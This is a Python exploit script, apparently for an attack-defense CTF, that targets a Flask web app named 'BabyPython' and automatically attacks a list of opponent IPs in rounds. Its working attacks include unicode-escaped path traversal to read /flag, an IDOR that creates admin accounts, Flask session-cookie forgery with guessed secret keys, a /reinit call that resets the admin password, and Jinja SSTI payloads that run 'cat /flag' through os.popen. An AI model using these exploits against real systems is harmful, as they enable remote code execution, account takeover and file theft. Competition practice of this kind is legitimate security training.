#!/usr/bin/env python3
"""
BabyPython Exploit - Multiple Attack Vectors
=============================================
1. Unicode escape path traversal in /download_attachment
2. DB reinit via delete_avatar chain
3. Flask session cookie forgery (if SECRET_KEY known)
4. IDOR + Mass Assignment
5. SSTI in post content
"""
import sys
import argparse
import time
import re
import random
import string
import hashlib
import requests

try:
    from flask_unsign import sign as flask_sign
    HAS_FLASK_UNSIGN = True
except ImportError:
    HAS_FLASK_UNSIGN = False

from awd_lib import chal, submit, get_targets, get_our_ip

chal("babypython.csv")

PORT = 5000
TIMEOUT = 8

# Known/common SECRET_KEYs to try for session forgery
KNOWN_SECRET_KEYS = [
    'babypython',
    'secret_key',
    'development', 
    'super_secret_key',
    '1ba8daa8779061adec5f76dad67469c410314046c631c7c4545e4468746dcf98',
]


def random_str(n=8):
    return ''.join(random.choices(string.ascii_lowercase, k=n))


def unicode_encode(s):
    """Encode each char as unicode escape to bypass byte filters"""
    return ''.join('\\u{:04x}'.format(ord(c)) for c in s)


def extract_flag(text):
    """Extract flag from response - try multiple patterns"""
    for pattern in [r'hkcert\d{2}\{[^}]+\}', r'flag\{[^}]+\}', r'FLAG\{[^}]+\}', r'CTF\{[^}]+\}', r'[A-Za-z0-9_]+\{[^}]{10,}\}']:
        match = re.search(pattern, text)
        if match:
            return match.group(0)
    return None


def exploit_idor(ip, port=PORT):
    """IDOR + Mass Assignment exploit + download_attachment combo
    
    Attack chain:
    1. Register as normal user
    2. Use IDOR to create admin user via /admin/user/add
    3. Login as new admin
    4. Use download_attachment with unicode bypass to read /flag
    """
    base_url = f"http://{ip}:{port}"
    session = requests.Session()
    
    try:
        # Register normal user
        username = f"idor_{random_str()}"
        session.post(f"{base_url}/register", 
                    data={"username": username, "password": username}, 
                    timeout=TIMEOUT)
        session.post(f"{base_url}/login", 
                    data={"username": username, "password": username}, 
                    timeout=TIMEOUT)
        
        # IDOR: Create admin user via unprotected endpoint
        admin_user = f"adm_{random_str()}"
        r = session.post(f"{base_url}/admin/user/add", 
                        data={"username": admin_user, "password": admin_user, "is_admin": "1"},
                        timeout=TIMEOUT)
        
        if r.status_code in [403, 401]:
            return ExploitResult(error='patched', status='idor_blocked')
        
        # Login as new admin
        admin_session = requests.Session()
        admin_session.post(f"{base_url}/login", 
                          data={"username": admin_user, "password": admin_user}, 
                          timeout=TIMEOUT)
        
        # Try download_attachment with unicode bypass
        for path in ["/flag", "../../../../flag", "../flag"]:
            encoded = unicode_encode(path)
            payload = '{"path": "' + encoded + '"}'
            r = admin_session.post(f"{base_url}/download_attachment",
                                  data=payload,
                                  headers={"Content-Type": "application/json"},
                                  timeout=TIMEOUT)
            if r.status_code == 200:
                flag = extract_flag(r.text)
                if flag:
                    return ExploitResult(flag=flag)
        
        # Also try admin panel directly
        r = admin_session.get(f"{base_url}/admin/panel", timeout=TIMEOUT)
        flag = extract_flag(r.text)
        if flag:
            return ExploitResult(flag=flag)
        
        return ExploitResult(error='patched', status='idor_no_flag')
    except Exception as e:
        return ExploitResult(error='unknown', status=f'idor:{str(e)[:30]}')


def exploit_session_forgery(ip, port=PORT):
    """Flask session cookie forgery - forge admin session if SECRET_KEY is known
    
    Attack: Create a valid session cookie with _user_id=1 (admin)
    Requires knowing the Flask SECRET_KEY
    """
    if not HAS_FLASK_UNSIGN:
        return ExploitResult(error='patched', status='flask_unsign_not_installed')
    
    base_url = f"http://{ip}:{port}"
    
    # Admin session payload
    admin_session = {
        '_fresh': True,
        '_id': 'ecebcf8253b40557c20ed41a59ff002b709e82689c69922c377019081d577d0a6d71450bc24e0b4a32d3bbf056116f71c0f05b6d15842747020564b0d6baf05e',
        '_user_id': '1'
    }
    
    for secret_key in KNOWN_SECRET_KEYS:
        try:
            # Forge session cookie
            forged_cookie = flask_sign(admin_session, secret_key)
            
            # Try to access admin panel with forged cookie
            session = requests.Session()
            session.cookies.set('session', forged_cookie)
            
            r = session.get(f"{base_url}/admin/panel", timeout=TIMEOUT)
            flag = extract_flag(r.text)
            if flag:
                return ExploitResult(flag=flag)
            
            # Also try /admin
            r = session.get(f"{base_url}/admin", timeout=TIMEOUT)
            flag = extract_flag(r.text)
            if flag:
                return ExploitResult(flag=flag)
                
        except Exception as e:
            continue
    
    return ExploitResult(error='patched', status='session_forgery_failed')


def exploit_direct_reinit(ip, port=PORT):
    """Direct /reinit exploit - just call reinit without triggering DB lock first"""
    base_url = f"http://{ip}:{port}"
    session = requests.Session()
    new_admin_pass = "pwned_password123"
    
    try:
        # Register and login any user
        username = random_str()
        session.post(f"{base_url}/register", 
                    data={"username": username, "password": username}, 
                    timeout=TIMEOUT)
        session.post(f"{base_url}/login", 
                    data={"username": username, "password": username}, 
                    timeout=TIMEOUT)
        
        # Directly call /reinit - might work if not protected
        r = session.post(f"{base_url}/reinit", 
                        data={"admin_password": new_admin_pass},
                        timeout=TIMEOUT)
        
        if r.status_code in [403, 401]:
            return ExploitResult(error='patched', status='reinit_blocked')
        
        # Fresh session to login as admin
        session2 = requests.Session()
        session2.get(f"{base_url}/login", timeout=TIMEOUT)
        r = session2.post(f"{base_url}/login", 
                         data={"username": "admin", "password": new_admin_pass},
                         timeout=TIMEOUT)
        
        # Check if login succeeded and get flag
        r = session2.get(f"{base_url}/admin/panel", timeout=TIMEOUT)
        flag = extract_flag(r.text)
        if flag:
            return ExploitResult(flag=flag)
        
        r = session2.get(f"{base_url}/admin", timeout=TIMEOUT)
        flag = extract_flag(r.text)
        if flag:
            return ExploitResult(flag=flag)
        
        return ExploitResult(error='patched', status='direct_reinit_no_flag')
    except Exception as e:
        return ExploitResult(error='unknown', status=f'direct_reinit:{str(e)[:30]}')


def exploit_ssti(ip, port=PORT):
    """SSTI exploit via post content (backup method)"""
    base_url = f"http://{ip}:{port}"
    session = requests.Session()
    
    try:
        # Register and login
        username = f"ssti_{random_str()}"
        session.post(f"{base_url}/register", 
                    data={"username": username, "password": username}, 
                    timeout=TIMEOUT)
        session.post(f"{base_url}/login", 
                    data={"username": username, "password": username}, 
                    timeout=TIMEOUT)
        
        # Create post with SSTI payload
        payloads = [
            "{{lipsum.__globals__['os'].popen('cat /flag').read()}}",
            "{{url_for.__globals__.__builtins__.open('/flag').read()}}",
            "{{config.__class__.__init__.__globals__['os'].popen('cat /flag').read()}}",
        ]
        
        for payload in payloads:
            r = session.post(f"{base_url}/create", 
                           data={"title": random_str(), "content": payload},
                           timeout=TIMEOUT, allow_redirects=True)
            
            if r.status_code == 400:
                continue  # SSTI blocked
            
            flag = extract_flag(r.text)
            if flag:
                return ExploitResult(flag=flag)
            
            # Check if we got redirected to view the post
            if '/post/' in r.url:
                view_r = session.get(r.url, timeout=TIMEOUT)
                flag = extract_flag(view_r.text)
                if flag:
                    return ExploitResult(flag=flag)
        
        return ExploitResult(error='patched', status='ssti_blocked')
    except Exception as e:
        return ExploitResult(error='unknown', status=f'ssti:{str(e)[:30]}')


def exploit_reinit(ip, port=PORT):
    """DB reinit exploit - delete avatars then reset admin password
    
    Attack chain (from captured traffic):
    1. Register/login as any user
    2. Access /admin/users to get user IDs
    3. For each user: edit -> delete_avatar -> edit again
    4. Call /reinit to reset admin password
    5. Login as admin -> get flag from /admin/panel
    """
    base_url = f"http://{ip}:{port}"
    session = requests.Session()
    new_admin_pass = "pwned_password123"
    
    try:
        # Step 1: Register and login
        username = random_str()
        session.post(f"{base_url}/register", 
                    data={"username": username, "password": username}, 
                    timeout=TIMEOUT)
        session.get(f"{base_url}/login", timeout=TIMEOUT)
        session.post(f"{base_url}/login", 
                    data={"username": username, "password": username}, 
                    timeout=TIMEOUT)
        
        # Step 2: Access /admin
        session.get(f"{base_url}/admin", timeout=TIMEOUT)
        
        # Step 3: Get user IDs from /admin/users
        r = session.get(f"{base_url}/admin/users", timeout=TIMEOUT)
        user_ids = re.findall(r'/admin/user/edit/(\d+)', r.text)
        
        # Step 4: Edit and delete avatar for users (triggers DB state change)
        for uid in user_ids[:5]:  # Do first 5 users
            session.get(f"{base_url}/admin/user/edit/{uid}", timeout=TIMEOUT)
            session.post(f"{base_url}/delete_avatar/{uid}", timeout=TIMEOUT)
            session.get(f"{base_url}/admin/user/edit/{uid}", timeout=TIMEOUT)
        
        # Step 5: Call /reinit to reset admin password
        r = session.post(f"{base_url}/reinit", 
                        data={"admin_password": new_admin_pass},
                        timeout=TIMEOUT, allow_redirects=False)
        
        if r.status_code == 403:
            return ExploitResult(error='patched', status='reinit_blocked')
        
        # Step 6: Fresh session - login as admin
        session2 = requests.Session()
        session2.get(f"{base_url}/login", timeout=TIMEOUT)
        r = session2.post(f"{base_url}/login", 
                         data={"username": "admin", "password": new_admin_pass},
                         timeout=TIMEOUT, allow_redirects=False)
        
        # Follow redirect if login succeeded
        if r.status_code == 302:
            loc = r.headers.get('Location', '/')
            if not loc.startswith('http'):
                loc = base_url + loc
            session2.get(loc, timeout=TIMEOUT)
        
        # Step 7: Check admin panel for flag
        r = session2.get(f"{base_url}/admin/panel", timeout=TIMEOUT)
        flag = extract_flag(r.text)
        if flag:
            return ExploitResult(flag=flag)
        
        r = session2.get(f"{base_url}/admin", timeout=TIMEOUT)
        flag = extract_flag(r.text)
        if flag:
            return ExploitResult(flag=flag)
        
        # Step 8: Try download_attachment with unicode bypass as admin
        for path in ["/flag", "../../../../flag", "../flag"]:
            payload = '{"' + unicode_encode("path") + '":"' + unicode_encode(path) + '"}'
            r = session2.post(f"{base_url}/download_attachment",
                             data=payload,
                             headers={
                                 "Content-Type": "application/json",
                                 "Origin": f"http://{ip}:{port}",
                                 "Referer": f"http://{ip}:{port}/admin"
                             },
                             timeout=TIMEOUT)
            flag = extract_flag(r.text)
            if flag:
                return ExploitResult(flag=flag)
        
        return ExploitResult(error='patched', status='reinit_no_flag')
    except Exception as e:
        return ExploitResult(error='unknown', status=f'reinit:{str(e)[:30]}')


def exploit_all(ip, port=PORT):
    """Try all exploit methods in order"""
    # Method 1: Unicode path traversal (fastest)
    result = exploit(ip, port)
    if result.flag:
        return result
    
    # Method 2: Session forgery (fast, no side effects)
    if result.error == 'patched':
        result2 = exploit_session_forgery(ip, port)
        if result2.flag:
            return result2
        
        # Method 3: Direct reinit (simple)
        result3 = exploit_direct_reinit(ip, port)
        if result3.flag:
            return result3
        
        # Method 4: Full reinit with delete_avatar chain
        result4 = exploit_reinit(ip, port)
        if result4.flag:
            return result4
        
        # Method 5: IDOR if reinit patched
        result5 = exploit_idor(ip, port)
        if result5.flag:
            return result5
        
        # Method 6: SSTI if IDOR also patched
        result6 = exploit_ssti(ip, port)
        if result6.flag:
            return result6
        
        # All methods failed
        return ExploitResult(error='patched', status='all_methods')
    
    return result


class ExploitResult:
    """Result of an exploit attempt with diagnostic info"""
    def __init__(self, flag=None, error=None, status=None):
        self.flag = flag
        self.error = error  # Error type: 'down', 'timeout', 'throttled', 'patched', 'auth_fail', 'unknown'
        self.status = status  # HTTP status code or error details
    
    def __bool__(self):
        return self.flag is not None
    
    def status_str(self):
        if self.flag:
            return "OK"
        return f"{self.error}" + (f"({self.status})" if self.status else "")


def exploit(ip, port=PORT):
    """Unicode escape path traversal exploit with diagnostics"""
    base_url = f"http://{ip}:{port}"
    session = requests.Session()
    
    # Step 1: Check if service is up
    try:
        r = session.get(f"{base_url}/", timeout=TIMEOUT)
    except requests.exceptions.ConnectionError:
        return ExploitResult(error='down', status='connection_refused')
    except requests.exceptions.Timeout:
        return ExploitResult(error='timeout', status='connect_timeout')
    except Exception as e:
        return ExploitResult(error='unknown', status=str(e)[:50])
    
    # Check for throttling on initial request
    if r.status_code == 429:
        return ExploitResult(error='throttled', status=429)
    if r.status_code >= 500:
        return ExploitResult(error='down', status=r.status_code)
    
    # Step 2: Register and login
    try:
        username = f"exp_{random_str()}"
        reg_r = session.post(f"{base_url}/register", 
                    data={"username": username, "password": username}, 
                    timeout=TIMEOUT)
        
        if reg_r.status_code == 429:
            return ExploitResult(error='throttled', status='register_429')
        
        login_r = session.post(f"{base_url}/login", 
                    data={"username": username, "password": username}, 
                    timeout=TIMEOUT)
        
        if login_r.status_code == 429:
            return ExploitResult(error='throttled', status='login_429')
        if login_r.status_code != 200 and login_r.status_code != 302:
            return ExploitResult(error='auth_fail', status=login_r.status_code)
            
    except requests.exceptions.Timeout:
        return ExploitResult(error='timeout', status='auth_timeout')
    except Exception as e:
        return ExploitResult(error='unknown', status=f'auth:{str(e)[:30]}')
    
    # Step 3: Try exploit paths with unicode encoding
    last_status = None
    last_response = None
    try:
        for path in ["/flag", "../../../../flag", "/app/flag", "../flag", "../../flag", "/root/flag"]:
            encoded = unicode_encode(path)
            payload = '{"path": "' + encoded + '"}'
            
            r = session.post(
                f"{base_url}/download_attachment",
                data=payload,
                headers={"Content-Type": "application/json"},
                timeout=TIMEOUT
            )
            last_status = r.status_code
            last_response = r.text[:100]
            
            if r.status_code == 429:
                return ExploitResult(error='throttled', status='exploit_429')
            
            if r.status_code == 200:
                flag = extract_flag(r.text)
                if flag:
                    return ExploitResult(flag=flag)
        
        # No flag found - likely patched
        # Check response to determine if patched vs other issue
        if last_status == 200:
            return ExploitResult(error='patched', status='no_flag_in_200')
        elif last_status == 403:
            return ExploitResult(error='patched', status='403_forbidden')
        elif last_status == 400:
            return ExploitResult(error='patched', status='400_bad_request')
        elif last_status == 404:
            return ExploitResult(error='patched', status='404_not_found')
        else:
            return ExploitResult(error='patched', status=last_status)
            
    except requests.exceptions.Timeout:
        return ExploitResult(error='timeout', status='exploit_timeout')
    except Exception as e:
        return ExploitResult(error='unknown', status=f'exploit:{str(e)[:30]}')


def main():
    parser = argparse.ArgumentParser(description='BabyPython Exploit')
    parser.add_argument('--target', '-t', help='Single target IP')
    parser.add_argument('--port', '-p', type=int, default=PORT)
    parser.add_argument('--loop', '-l', action='store_true', help='Loop continuously')
    parser.add_argument('--delay', '-d', type=int, default=60, help='Loop delay')
    parser.add_argument('--full', '-f', action='store_true', help='Try all exploit methods (IDOR, SSTI) if primary fails')
    parser.add_argument('--reinit', '-r', action='store_true', help='Use reinit exploit method (from attack logs)')
    parser.add_argument('--forge', action='store_true', help='Use session cookie forgery exploit')
    parser.add_argument('--secret-key', '-k', help='Flask SECRET_KEY for session forgery')
    args = parser.parse_args()
    
    # Add custom secret key if provided
    if args.secret_key and args.secret_key not in KNOWN_SECRET_KEYS:
        KNOWN_SECRET_KEYS.insert(0, args.secret_key)
    
    my_ip = get_our_ip()
    targets = [args.target] if args.target else get_targets()
    targets = [ip for ip in targets if ip != my_ip]
    
    print(f"[*] Our IP: {my_ip}, Targets: {len(targets)}")
    
    if not targets:
        # Hardcode targets if CSV parsing fails
        targets = ['172.28.36.32', '172.28.36.33', '172.28.36.34', '172.28.36.35']
        targets = [ip for ip in targets if ip != my_ip]
        print(f"[*] Using hardcoded targets: {targets}")
    
    round_num = 0
    while True:
        round_num += 1
        stats = {'success': 0, 'down': 0, 'timeout': 0, 'throttled': 0, 'patched': 0, 'auth_fail': 0, 'unknown': 0}
        new_flags = 0
        start = time.time()
        
        print(f"\n=== Round {round_num} ===")
        
        for ip in targets:
            if args.forge:
                result = exploit_session_forgery(ip, args.port)
            elif args.reinit:
                result = exploit_reinit(ip, args.port)
            elif args.full:
                result = exploit_all(ip, args.port)
            else:
                result = exploit(ip, args.port)
            if result.flag:
                sub_result = submit(result.flag, target=ip)
                status = "NEW" if sub_result.get('success') and not sub_result.get('duplicate') else "dup"
                print(f"[+] {ip}: {result.flag} ({status})")
                stats['success'] += 1
                if status == "NEW":
                    new_flags += 1
            else:
                err = result.error or 'unknown'
                stats[err] = stats.get(err, 0) + 1
                print(f"[-] {ip}: {result.status_str()}")
        
        # Summary with breakdown
        summary_parts = [f"{stats['success']} ok"]
        for err_type in ['down', 'timeout', 'throttled', 'patched', 'auth_fail', 'unknown']:
            if stats.get(err_type, 0) > 0:
                summary_parts.append(f"{stats[err_type]} {err_type}")
        print(f"[*] Round {round_num}: {', '.join(summary_parts)}, {new_flags} NEW ({time.time()-start:.1f}s)")
        
        if not args.loop:
            break
        
        print(f"[*] Sleeping {args.delay}s...")
        try:
            time.sleep(args.delay)
        except KeyboardInterrupt:
            print("\n[!] Stopped")
            break


if __name__ == '__main__':
    main()
